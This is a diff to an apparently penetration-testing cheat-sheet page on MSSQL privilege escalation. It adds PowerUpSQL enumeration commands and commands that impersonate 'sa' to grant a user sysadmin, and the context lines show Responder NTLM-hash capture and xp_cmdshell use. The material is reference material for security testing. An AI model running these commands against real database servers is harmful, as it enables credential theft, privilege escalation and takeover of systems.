@@ -1,8 +1,27 @@
 ---
 title: "MSSQL Privilege Escalation"
 date: 2024-6-27
-tags: ["Hash Cracking", "Database Dumping", "Privilege Escalation In Databases", "Ntlm", "Mssql", "Database", "Windows", "RCE"]
+tags: ["Hash Cracking", "Database Dumping", "Privilege Escalation In Databases", "Ntlm", "Mssql", "Database", "Windows", "RCE", "Enum"]
 ---
+
+### Enum
+
+```console
+# Import Module
+. .\PowerUpSQL.ps1
+```
+
+```console
+# Audit
+Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose
+```
+
+```console
+# Execute Query
+Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose
+```
+
+<small>*Ref: [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)*</small>
 
 ### Abuse #1: Steal NTLM hash
 
@@ -11,7 +30,7 @@ tags: ["Hash Cracking", "Database Dumping", "Privilege Escalation In Databases",
 sudo responder -I tun0
 ```
 
-{{< tab set1 tab1 active >}}Method 1{{< /tab >}}
+{{< tab set1 tab1 >}}Method 1{{< /tab >}}
 {{< tab set1 tab2 >}}Method 2{{< /tab >}}
 {{< tab set1 tab3 >}}Method 3{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
@@ -59,6 +78,16 @@ xp_cmdshell whoami
 ```
 
 ### Abuse #3: Impersonate sa to run xp_cmdshell
+
+```console
+# Add user to sysadmin
+execute as login = 'sa'; exec sp_addsrvrolemember '<USER>','sysadmin'
+```
+
+```console
+# Check
+SELECT is_srvrolemember('sysadmin');
+```
 
 ```console
 execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
